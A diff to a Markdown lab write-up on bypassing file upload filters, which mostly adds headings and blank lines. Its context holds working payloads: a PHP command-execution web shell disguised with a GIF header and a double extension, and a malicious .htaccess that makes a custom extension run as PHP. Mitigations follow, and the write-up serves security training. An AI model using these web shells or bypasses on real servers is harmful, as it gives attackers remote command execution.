@@ -18,6 +18,7 @@ Demonstrate multiple file upload bypass techniques to execute malicious code des
 **Objective:** Upload PHP shell disguised as valid image
 
 ```bash
+
 # Create PHP shell with GIF header
 echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.gif.php
 
@@ -36,9 +37,11 @@ Technique 3: .htaccess Override
 Objective: Upload malicious .htaccess to redefine executable extensions
 
 apache
+
 # Malicious .htaccess content
 AddType application/x-httpd-php .omer
 bash
+
 # Upload shell.omer with PHP code
 echo '<?php system($_GET["cmd"]); ?>' > shell.omer
 Bypass: Server configuration override through .htaccess
@@ -58,7 +61,7 @@ Virus Scanning: Implement malware scanning for all uploads
 
 .htaccess Restrictions: Disable .htaccess overrides in upload directories
 
-📊 Skills Demonstrated
+## 📊 Skills Demonstrated
 Multi-Vector Bypass: Applying different techniques based on defenses
 
 Server Configuration: Understanding web server file handling behavior
@@ -67,5 +70,7 @@ Content Analysis: Differentiating between file headers and actual content
 
 Defense Layering: Analyzing cumulative security control effectiveness
 
-Conducted in controlled environment for educational purposes
+## Notes
+
+Conducted in a controlled environment for educational purposes.
 ```
